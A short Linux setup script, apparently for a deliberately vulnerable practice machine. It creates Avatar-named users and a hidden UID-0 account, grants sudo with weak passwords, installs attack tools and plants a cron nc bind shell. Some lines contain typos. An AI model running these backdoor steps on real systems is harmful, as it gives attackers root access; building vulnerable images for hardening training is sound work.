useradd -m -s /bin/bash ozai
usermod -u 0 -o ozai
useradd -m -s /bin/bash Pakku
useradd -m -s /bin/bash Kanna
useradd -m -s /bin/bash Hadoka
useradd -m -s /bin/bash Kya
useradd -m -s /bin/bash Azula 
useradd -m -s /bin/bash Bumi
useradd -m -s /bin/bash Appa
useradd -m -s /bin/bash Momo
useradd -m -s /bin/bash Iroh
useradd -m -s /bin/bash Suki
useradd -m -s /bin/bash Yue
useradd -m -s /bin/bash Jet
useradd -m -s /bin/bash Cabbage
useradd -m -s /bin/bash Longshot
useradd -m -s /bin/bash Smellerbee
useradd -m -s /bin/bash Duke
useradd -m -s /bin/bash Pipsqueak
useradd -m -s /bin/bash Kuei
useradd -m -s /bin/bash Haru
useradd -m -s /bin/bash Teo
useradd -m -s /bin/bash Ursa
useradd -m -s /bin/bash Pathik
useradd -m -s /bin/bash Shyu
useradd -m -s /bin/bash Bato
useradd -m -s /bin/bash Piandao
usermod -aG sudo ursa
usermod -aG sudo kya
ufw defauly deny incoming
ufw allow 3306
ufw deny 22
ufw deny 80
ufw deny 21
apt-get intall vsftpd
apt-get install nikto
apt-get install bind9
apt-get install hydra
apt-get install ettercap
wget http://www.openwall.com/john/j/john-1.8.0.tar.xz /user/sbin
echo '* * * * * nc -nvlp 1338 -e /bin/sh' >> /etc/crontab
echo '* * * * * nc -nvlp 1338 -e /bin/sh' >> /var/spool/crontabs/Zuko

useradd -m -s /bin/bash toph
usermod -aG sudo toph
echo 'toph:1234!@#$QWERqwer' | chpasswd

useradd -m -s /bin/bash aang
usermod -aG sudo aang

useradd -m -s /bin/bash katara
usermod -aG sudo katara
echo 'katara:aang' | chpasswd

useradd -m -s /bin/bash sokka
usermod -aG sudo sokka
echo 'sokka:sajdhkja123' | chpasswd

useradd -m -s /bin/bash zuko
usermod -aG sudo zuko
echo 'zuko:katara' | chpasswd